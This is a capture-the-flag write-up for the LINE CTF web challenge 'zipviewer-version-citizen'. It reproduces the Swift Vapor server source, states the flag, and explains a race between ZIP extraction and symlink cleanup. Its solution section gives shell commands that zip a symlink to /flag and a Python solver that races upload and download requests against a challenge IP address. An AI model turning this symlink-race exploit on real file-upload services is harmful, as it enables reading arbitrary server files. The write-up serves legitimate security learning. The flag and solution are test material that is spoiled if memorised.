# zipviewer-version-citizen

## Source Code

<details><summary>file tree</summary>

```console
$ unzip -t zipviewer-version-citizen_f505c88b0906136c529e1d443530c2e9.zip
Archive:  zipviewer-version-citizen_f505c88b0906136c529e1d443530c2e9.zip
    testing: dist/                    OK
    testing: dist/flag                OK
    testing: dist/Dockerfile          OK
    testing: dist/Resources/          OK
    testing: dist/Resources/Views/    OK
    testing: dist/Resources/Views/index.leaf   OK
    testing: dist/Resources/Views/viewer.leaf   OK
    testing: dist/Tests/              OK
    testing: dist/Tests/AppTests/     OK
    testing: dist/Tests/AppTests/AppTests.swift   OK
    testing: dist/Public/             OK
    testing: dist/Public/favicon.ico   OK
    testing: dist/Public/static/      OK
    testing: dist/Public/static/zipviewer.js   OK
    testing: dist/Public/static/zipviewer.css   OK
    testing: dist/Package.swift       OK
    testing: dist/Sources/            OK
    testing: dist/Sources/App/        OK
    testing: dist/Sources/App/entrypoint.swift   OK
    testing: dist/Sources/App/configure.swift   OK
    testing: dist/Sources/App/routes.swift   OK
    testing: dist/docker-compose.yml   OK
    testing: dist/nginx.conf          OK
No errors detected in compressed data of zipviewer-version-citizen_f505c88b0906136c529e1d443530c2e9.zip.
```

</details>

<details><summary>dist/Package.swift</summary>

```swift
// swift-tools-version: 5.9
import PackageDescription

let package = Package(
    name: "zipviewer-version-citizen",
    platforms: [
       .macOS(.v13)
    ],
    dependencies: [
        .package(url: "https://github.com/vapor/vapor.git", exact: "4.89.0"),
        .package(url: "https://github.com/vapor/leaf.git", exact: "4.2.4"),
        .package(url: "https://github.com/weichsel/ZIPFoundation.git", exact: "0.9.18"),
        .package(url: "https://github.com/apple/swift-crypto.git", exact: "3.1.0"),
    ],
    targets: [
        .executableTarget(
            name: "App",
            dependencies: [
                .product(name: "Leaf", package: "leaf"),
                .product(name: "Vapor", package: "vapor"),
                .product(name: "ZIPFoundation", package: "ZIPFoundation"),
                .product(name: "Crypto", package: "swift-crypto"),
            ]
        ),
        .testTarget(name: "AppTests", dependencies: [
            .target(name: "App"),
            .product(name: "XCTVapor", package: "vapor"),
            .product(name: "Vapor", package: "vapor"),
            .product(name: "Leaf", package: "leaf"),
        ])
    ]
)
```

</details>

<details><summary>dist/Sources/App/routes.swift</summary>

```swift
import Vapor
import Crypto
import ZIPFoundation

enum CustomError: Error {
    case MissingSessionError
    case InvalidZipFile
    case FileNotFound
    case IsDirectory
    case FaildFileRead
    case GenerationErrorSHA256
}

struct ViewContext: Encodable {
    var userSession: String
    var fileList: [String]
}

struct ResponseMessage: Content {
    var message: String
    var status: Int
}

struct Input: Content {
    var data: Data
}

let SALT: String = Environment.get("SALT") ?? "Unknown"

func routes(_ app: Application) throws {

    app.get { req async throws -> View in
        _ = try getRealIPAddress(req: req)

        return try await req.view.render("index")
    }

    app.get("enter", ":username") { req async throws -> ResponseMessage in
        _ = try getRealIPAddress(req: req)

        do {
            let username = req.parameters.get("username")

            req.session.data["user"] = username
            req.session.data["uuid"] = UUID().uuidString
            req.logger.info("GET /enter -> NAME == \(req.session.data["user"] ?? "Unknown")")
            req.logger.info("GET /enter -> UUID == \(req.session.data["uuid"] ?? "Unknown")")

        } catch {
            throw Abort(.internalServerError, reason: "Something Wrong")
        }

        return ResponseMessage(message: "Welcome, \(req.session.data["user"] ?? "Unkown")", status: 200)
    }

    app.get("viewer") { req async throws -> View in
        _ = try getRealIPAddress(req: req)

        if !req.hasSession {
            throw Abort(.unauthorized, reason: "Session not found")
        }

        var fileList: [String] = []

        let username = req.session.data["user"] ?? "Unknown"
        let uuid = req.session.data["uuid"] ?? "Unknown"
        req.logger.info("GET /viewer -> NAME == \(username)")
        req.logger.info("GET /viewer -> UUID == \(uuid)")

        do {
            if username == "Unknown" || uuid == "Unknown" {
                throw CustomError.MissingSessionError
            }

            let hashed = try GenerateSHA256(username + uuid + SALT)
            let filepath = "Upload/" + hashed
            req.logger.info("GET /viewer -> filepath == \(filepath)")

            if (try IsExistDir(filepath: filepath)) {
                fileList = try GetEntryListInZipFile(fileName: filepath + ".zip")
            }

        } catch CustomError.MissingSessionError {
            throw Abort(.unauthorized, reason: "User not found, Please entering from index page")
        } catch {
            throw Abort(.internalServerError, reason: "Something Wrong")
        }

        return try await req.view.render("viewer", ViewContext(userSession: username, fileList: fileList))
    }

    app.post("upload") { req async throws -> ResponseMessage in
        _ = try getRealIPAddress(req: req)

        if !req.hasSession {
            throw Abort(.unauthorized, reason: "Session not found")
        }

        var hashed = ""
        var filePath = ""
        var fileName = ""

        let username = req.session.data["user"] ?? "Unknown"
        let uuid = req.session.data["uuid"] ?? "Unknown"
        req.logger.info("GET /upload -> NAME == \(username)")
        req.logger.info("GET /upload -> UUID == \(uuid)")

        do {
            if username == "Unknown" || uuid == "Unknown" {
                throw CustomError.MissingSessionError
            }

            hashed = try GenerateSHA256(username + uuid + SALT)
            filePath = "Upload/" + hashed
            fileName = filePath + ".zip"
            req.logger.info("filename : \(fileName)")

            try ClearFiles(filepath: filePath)

            let file = try req.content.decode(Input.self).data
            try IsZipFile(data: file)
            try await req.fileio.writeFile(ByteBuffer(data: file), at: fileName)

            let fileList = try GetEntryListInZipFile(fileName: fileName)
            _ = try Unzip(filename: fileName, filepath: filePath)

            guard try CleanupUploadedFile(filePath: filePath, fileList: fileList) else {
                throw Abort(.internalServerError, reason: "Something Wrong")
            }

        } catch CustomError.InvalidZipFile {
            throw Abort(.badRequest, reason: "File is not Zip")
        } catch {
            try ClearFiles(filepath: filePath)
            throw Abort(.internalServerError, reason: "Something Wrong")
        }

        return ResponseMessage(message: "DONE", status: 200)
    }

    app.get("download", "**") {req async throws -> Response in
        _ = try getRealIPAddress(req: req)

        if !req.hasSession {
            throw Abort(.unauthorized, reason: "Session not found")
        }

        var res = Response(status: .ok)

        let username = req.session.data["user"] ?? "Unknown"
        let uuid = req.session.data["uuid"] ?? "Unknown"
        req.logger.info("GET /download -> NAME == \(username)")
        req.logger.info("GET /download -> UUID == \(uuid)")

        do {
            let fileName = req.parameters.getCatchall().joined(separator: "/")
            req.logger.info("GET /download -> fileName == \(fileName)")

            let hashed = try GenerateSHA256(username + uuid + SALT)
            let filepath = "Upload/" + hashed

            let file = try IsExistFile(filename: fileName, filepath: filepath)
            let data = try ReadFile(file: file)

            let attachedFileName: String = fileName.components(separatedBy: "/").last ?? "0"
            res.headers.contentType = .init(type: "application", subType: "octet-stream")
            res.body = .init(data: data)
            res.headers.add(name: "Content-Disposition", value: "attachment; filename=\"\(attachedFileName)\"")

        } catch CustomError.FileNotFound {
            throw Abort(.notFound, reason: "File Not Found")
        } catch CustomError.IsDirectory {
            throw Abort(.notAcceptable, reason: "This is Directory")
        } catch {
            throw Abort(.internalServerError, reason: "Something Wrong")
        }

        return res
    }

    app.delete("clear") { req async throws -> ResponseMessage in
        _ = try getRealIPAddress(req: req)

        if !req.hasSession {
            throw Abort(.unauthorized, reason: "Session not found")
        }

        let username = req.session.data["user"] ?? "Unknown"
        let uuid = req.session.data["uuid"] ?? "Unknown"
        req.logger.info("GET /clear -> NAME == \(username)")
        req.logger.info("GET /clear -> UUID == \(uuid)")

        do {
            let hashed = try GenerateSHA256(username + uuid + SALT)
            let filePath = "Upload/" + hashed

            try ClearFiles(filepath: filePath)

        } catch {
            throw Abort(.internalServerError, reason: "Something Wrong")
        }

        req.session.destroy()

        return ResponseMessage(message: "DONE", status: 200)
    }
}

func GenerateSHA256(_ input: String) throws -> String {
    if let data = input.data(using: .utf8) {
        let hashed = SHA256.hash(data: data)

        return hashed.compactMap { String(format: "%02x", $0) }.joined()
    }

    throw CustomError.GenerationErrorSHA256
}

func IsZipFile(data: Data) throws -> Bool {
    let fileData = Data(data)
    let magicNumber: [UInt8] = [0x50, 0x4B, 0x03, 0x04]

    let dataPrefix = fileData.prefix(magicNumber.count)

    if dataPrefix.elementsEqual(magicNumber) != true {
        throw CustomError.InvalidZipFile
    }

    return true
}

func IsSymbolicLink(filePath: String) throws -> Bool {
    let fileAttributes = try FileManager.default.attributesOfItem(atPath: filePath)
    let fileType = fileAttributes[.type] as? FileAttributeType

    if fileType == .typeSymbolicLink {
        return true
    }

    return false
}

func IsDirectory(filePath: String) throws -> Bool {
    let fileAttributes = try FileManager.default.attributesOfItem(atPath: filePath)
    let fileType = fileAttributes[.type] as? FileAttributeType

    if fileType == .typeDirectory {
        return true
    }

    return false
}

func IsExistDir(filepath: String) throws -> Bool {
    let fileManager = FileManager()

    let currentWorkingPath = fileManager.currentDirectoryPath

    var targetURL = URL(fileURLWithPath: currentWorkingPath)
    targetURL.appendPathComponent(filepath)

    if !fileManager.fileExists(atPath: targetURL.path) {
        return false
    }

    return true
}

func IsExistFile(filename: String, filepath: String) throws -> String {
    let fileManager = FileManager()
    let currentWorkingPath = fileManager.currentDirectoryPath

    var targetURL = URL(fileURLWithPath: currentWorkingPath)
    targetURL.appendPathComponent(filepath)
    targetURL.appendPathComponent(filename)

    print(targetURL.path)

    if !fileManager.fileExists(atPath: targetURL.path) {
        throw CustomError.FileNotFound
    } else if try IsDirectory(filePath: targetURL.path) {
        throw CustomError.IsDirectory
    }

    return targetURL.path
}

func ReadFile(file: String) throws -> Data {
    let data = try Data(contentsOf: URL(fileURLWithPath: file))

    return data
}

func ClearFiles(filepath: String) throws -> Bool {
    let fileManager = FileManager()
    let currentWorkingPath = fileManager.currentDirectoryPath

    var targetURL = URL(fileURLWithPath: currentWorkingPath)
    targetURL.appendPathComponent(filepath)

    print("ClearFile() -> \(targetURL.path)")
    let zipFileName = targetURL.path + ".zip"

    if (fileManager.fileExists(atPath: zipFileName)) {
        try fileManager.removeItem(atPath: zipFileName)
    }

    if fileManager.fileExists(atPath: targetURL.path) {
        try fileManager.removeItem(at: targetURL)
    }

    return true
}

func Unzip(filename: String, filepath: String) throws -> Bool {
    let fileManager = FileManager()
    let currentWorkingPath = fileManager.currentDirectoryPath

    var sourceURL = URL(fileURLWithPath: currentWorkingPath)
    sourceURL.appendPathComponent(filename)

    var destinationURL = URL(fileURLWithPath: currentWorkingPath)
    destinationURL.appendPathComponent(filepath)

    try fileManager.createDirectory(at: destinationURL, withIntermediateDirectories: true, attributes: nil)
    try fileManager.unzipItem(at: sourceURL, to: destinationURL, allowUncontainedSymlinks: true)

    return true
}

func GetEntryListInZipFile(fileName: String) throws -> [String] {
    var entryList: [String] = []

    let archiveURL = URL(fileURLWithPath: fileName)

    guard let archive = try Archive(url: archiveURL, accessMode: .read) else  {
        return entryList
    }

    for entry in archive {
        var components = entry.path.components(separatedBy: "/")
        components = components.filter { $0 != ".." }

        entryList.append(components.joined(separator: "/"))
    }

    return entryList
}

func CleanupUploadedFile(filePath: String, fileList: [String]) throws -> Bool {
    do {
        let fileManager = FileManager()
        let currentWorkingPath = fileManager.currentDirectoryPath

        print("File Count \(fileList.count)")

        for fileName in fileList {
            var originPath = URL(fileURLWithPath: currentWorkingPath)

            originPath.appendPathComponent(filePath)
            originPath.appendPathComponent(fileName)

            if !fileManager.fileExists(atPath: originPath.path) {
                print("file not found")
                continue
            }

            if (try IsSymbolicLink(filePath: originPath.path)) {
                print("Find Symbol!! >> \(originPath.path)")
                try fileManager.removeItem(at: originPath)
            }
        }
    } catch {
        return false
    }

    return true
}

func getRealIPAddress(req: Request) throws -> String {
    var ip = req.remoteAddress?.ipAddress ?? "Unknown"
    if let xRealIP = req.headers.first(name: "X-Real-IP") {
        ip = xRealIP
    }

    req.logger.info("getRealIPAddress() -> IP == \(ip)")

    return ip
}
```

</details>

## Flag

LINECTF{af9390451ae12393880d76ea1f6cffc1}

## Solution

The application has [Vapor](https://github.com/vapor/vapor), a server-side Swift HTTP web framework.
The application features functionality to upload ZIP archive (/upload) and download the contents of the extracted files within the ZIP archive (/download).

Exploit rase condition in /upload and /download.
An uploaded ZIP archive is extracted to /app/Upload/\<hash>/, and then the extracted files are cleaned up using the `CleanupUploadedFile` function:

```swift
// routes.swift

    app.post("upload") { req async throws -> ResponseMessage in
        _ = try getRealIPAddress(req: req)

        if !req.hasSession {
            throw Abort(.unauthorized, reason: "Session not found")
        }

        var hashed = ""
        var filePath = ""
        var fileName = ""

        let username = req.session.data["user"] ?? "Unknown"
        let uuid = req.session.data["uuid"] ?? "Unknown"
        req.logger.info("GET /upload -> NAME == \(username)")
        req.logger.info("GET /upload -> UUID == \(uuid)")

        do {
            if username == "Unknown" || uuid == "Unknown" {
                throw CustomError.MissingSessionError
            }

            hashed = try GenerateSHA256(username + uuid + SALT)
            filePath = "Upload/" + hashed
            fileName = filePath + ".zip"
            req.logger.info("filename : \(fileName)")

            try ClearFiles(filepath: filePath)

            let file = try req.content.decode(Input.self).data
            try IsZipFile(data: file)
            try await req.fileio.writeFile(ByteBuffer(data: file), at: fileName)

            let fileList = try GetEntryListInZipFile(fileName: fileName)
            _ = try Unzip(filename: fileName, filepath: filePath)

            guard try CleanupUploadedFile(filePath: filePath, fileList: fileList) else {
                throw Abort(.internalServerError, reason: "Something Wrong")
            }
```

The file list in the ZIP archive is passed to `CleanupUploadedFile` function, where each file is checked sequentially.
If the file is a symbolic link, remove it:

```swift
// routes.swift

func CleanupUploadedFile(filePath: String, fileList: [String]) throws -> Bool {
    do {
        let fileManager = FileManager()
        let currentWorkingPath = fileManager.currentDirectoryPath

        print("File Count \(fileList.count)")

        for fileName in fileList {
            var originPath = URL(fileURLWithPath: currentWorkingPath)

            originPath.appendPathComponent(filePath)
            originPath.appendPathComponent(fileName)

            if !fileManager.fileExists(atPath: originPath.path) {
                print("file not found")
                continue
            }

            if (try IsSymbolicLink(filePath: originPath.path)) {
                print("Find Symbol!! >> \(originPath.path)")
                try fileManager.removeItem(at: originPath)
            }
        }
    } catch {
        return false
    }

    return true
}
```

Also, exploiting a ZIP archive containing symbolic links during extraction may allow reading arbitrary files.

- [File Upload \| HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload#symlink)

Since the ZIP archive is first extracted to a /app/Upload/\<hash>/ directory then cleanup on symbolic link files, a symlink file exists temporarily.
Exploiting this by referencing the symlink file allows retrieval of the flag located in /flag.

## Solution

1. Create a ZIP archive

    ```bash
    ln -s /flag symlink.txt
    zip --symlinks tmp.zip symlink.txt
    unzip -t tmp.zip  # check
    ```

2. solver.py

    ```python
    import concurrent.futures
    import re
    import requests
    
    requests.packages.urllib3.disable_warnings()
    
    s = requests.Session()
    # s.proxies = {"http": "http://127.0.0.1:8080"}
    s.verify = False
    
    # BASE_URL = "http://localhost:11000"
    BASE_URL = "http://34.84.43.130:11000"
    s.cookies.update({"vapor_session": "7rdRJvdENl1ibzWLxFkHGwhf3Mf2zA1Y6i2HyqjuIDk="})
    
    def upload():
        s.post(f"{BASE_URL}/upload", files={"data": open("tmp.zip", "rb")})
    
    
    def download():
        resp = s.get(f"{BASE_URL}/download/symlink.txt")
        if m := re.findall(r"LINECTF", resp.text):
            print(resp.text)
    
    
    def main():
        for _ in range(100):
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                executor.submit(upload)
                executor.submit(download)
    
    
    if __name__ == "__main__":
        main()
    ```

3. Execute solver.py

    ```console
    $ python3 solver.py
    LINECTF{af9390451ae12393880d76ea1f6cffc1}
    ```
